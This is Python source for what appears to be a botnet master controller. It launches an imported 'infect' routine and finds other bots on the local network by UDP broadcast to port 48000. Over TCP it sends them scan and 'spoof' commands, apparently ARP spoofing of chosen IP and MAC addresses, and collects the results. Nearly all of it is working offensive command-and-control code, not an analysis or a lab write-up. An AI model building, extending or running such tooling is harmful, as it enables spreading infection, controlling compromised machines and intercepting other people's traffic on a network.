import multiprocessing
import time
import enum
from infect import main_infect
import threading
import socket


# the protocol
class Types(enum.Enum):
    COMMAND = 1
    COMMAND_RESULT = 2


# convert requests to the valid operation
def convert(choice):
    if choice == "scan" or choice.find("scan:") != -1 or choice.find("spoof:") != -1 or choice == "get_tree":
        return Types.COMMAND
    elif choice == "scan_result" or choice == "scan_result:" or choice == "spoof_result" or choice == "tree_result":
        return Types.COMMAND_RESULT
    return None


# handles all the commands
def handle_command(data):
    global choice, clients
    if data == "scan":
        parent_conn.send(data)
        clients = parent_conn.recv()
        choice = "scan_result"
        return clients

    elif data.find("scan:") != -1:
        parent_conn.send(data)
        mac = parent_conn.recv()
        choice = "scan_result:"
        clients.append({'ip': data.split(":")[1], 'mac': mac})
        return mac

    elif data.find("spoof:") != -1:
        chosen_ip = data.split(":")[1]
        chosen_mac = ""
        for client in clients:
            if client['ip'] == chosen_ip:
                chosen_mac = client['mac']
        parent_conn.send(data)
        parent_conn.send(chosen_ip)
        parent_conn.send(chosen_mac)
        result = parent_conn.recv()
        choice = "spoof_result"
        return result

    elif data == "get_tree":
        choice = "tree_result"
        return lan_tree


# handles all the command's results (sends back to the bot master)
def handle_command_result(data, output):
    if data == "scan_result":
        print("IP" + " " * 15 + "MAC")
        if output:
            for client in output:
                print("{}   {}".format(client['ip'], client['mac']))
        else:
            print("scan failed")

    elif data == "scan_result:":
        print(output)

    elif data == "spoof_result":
        print(output)

    elif data == "tree_result":
        print(output)


# sends to the entire network message to check for other bots
def send_to_network():
    sender_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        for host in ips:
            sender_udp.sendto("####".encode(), (host, 48000))
        time.sleep(30.0)


# listening for bots in the LAN and answering them
def recv_replies():
    receiver_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    receiver_udp.bind(("0.0.0.0", 48000))
    while True:
        (reply, remote_address) = receiver_udp.recvfrom(4)
        if reply.decode().find("#") != -1 and remote_address[0] not in lan_tree:
            lan_tree.append(remote_address[0])
            receiver_udp.sendto("####".encode(), (remote_address[0], 48000))


# prepares a list of ips to send them the bot message
def ip_list():
    ips = []
    my_ip = ip
    numbers = my_ip.split(".")
    third_digit = str(int(numbers[2]) - 2)
    fourth_digit = "0"

    if int(third_digit) < 0:
        third_digit = "0"

    while int(third_digit) <= int(numbers[2]) + 2:
        host = numbers[0] + "." + numbers[1] + "." + third_digit + "." + fourth_digit
        ips.append(host)
        if int(fourth_digit) < 255:
            fourth_digit = str(int(fourth_digit) + 1)
        else:
            third_digit = str(int(third_digit) + 1)
            fourth_digit = "0"

    return ips


# search for all the active bots in LAN
def search_bots():
    global lan_tree
    old_lan = lan_tree
    lan_tree = []
    master_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for bot in old_lan:
        for i in range(20):
            master_socket.sendto("####".encode(), (bot, 48000))


# listens for connections
def listener():
    tcp_listener = socket.socket()
    tcp_listener.bind(("0.0.0.0", 49000))
    tcp_listener.listen()

    while True:
        (client_socket, client_address) = tcp_listener.accept()
        print(client_address)
        con_th = threading.Thread(target=con_thread_master, args=(client_socket, client_address,))
        con_th.start()


# handles the messages that the master receives
def con_thread_master(sock, addr):
    global last_result, results
    while True:
        try:
            result = sock.recv(1024).decode()
            # if the master receives a message that is not the same as the instruction or the last answer
            if result != results and result != msg and result != last_result:
                results = result
                last_result = result
        except Exception as ex:
            print(ex)
            sock.close()
            return


if __name__ == '__main__':
    # get ip
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()

    ips = ip_list()
    lan_tree = []
    # results is the message to print
    results = ""
    connections = []
    last_result = ""

    send_thread = threading.Thread(target=send_to_network)
    recv_thread = threading.Thread(target=recv_replies)
    send_thread.start()
    recv_thread.start()

    can_infect = False
    # creating a duplex pipe for the IPC
    parent_conn, child_conn = multiprocessing.Pipe()
    choice = ""
    data = ""
    output = ""
    clients = []
    connection = ""

    # tries to spawn the infection process
    try:
        p1 = multiprocessing.Process(target=main_infect, args=(child_conn, ))
        p1.start()
        can_infect = True
    except Exception as ex:
        print(ex)

    if can_infect:
        print("can_infect")

    tcp_socket = socket.socket()

    listener_thread = threading.Thread(target=listener)
    listener_thread.start()

    # handles the master commands
    while True:
        if choice == "":
            choice = input("ins")

        elif choice.find("master") == -1:
            data = choice
            data_type = convert(choice)
            choice = ""

            if not data_type:
                print("invalid instruction")

            else:
                if data_type == Types.COMMAND:
                    output = handle_command(data)
                elif data_type == Types.COMMAND_RESULT:
                    handle_command_result(data, output)
        else:
            master_command = choice.split(".")[1]
            choice = ""
            if master_command == "search_bots":
                search_bots()
            elif master_command == "get_tree":
                print(lan_tree)
            elif master_command == "get_bot_tree":
                botip = input("enter bot ip (q to quit)")
                if botip != "q":
                    try:
                        if not connection:
                            tcp_socket.connect((botip, 49000))
                        msg = "get_trees-" + botip
                        results = ""
                        tcp_socket.send(msg.encode())
                        start = time.time()
                        while time.time() - start < 20:
                            if results:
                                print(results)
                                break
                        results = ""
                        connection = botip
                    except Exception as e:
                        tcp_socket = socket.socket()
                        connection = ""
                        print(str(e))
            elif master_command == "show_entire_network":
                pass
            elif master_command == "send_command":
                botip = input("enter bot ip (q to quit)")
                if botip != "q":
                    try:
                        if not connection:
                            tcp_socket.connect((botip, 49000))
                            connection = botip
                        command = input("enter command")
                        if command.find("scan") != -1:
                            msg = command + "-" + botip
                            print(msg)
                            results = ""
                            tcp_socket.send(msg.encode())
                            start = time.time()
                            while time.time() - start < 20:
                                if results:
                                    print(results)
                                    break
                            results = ""
                        if command.find("spoof") != -1:
                            msg = command + "-" + botip + "-" + ip
                            tcp_socket.send(msg.encode())
                    except Exception as e:
                        tcp_socket = socket.socket()
                        connection = ""
                        print(str(e))
                pass
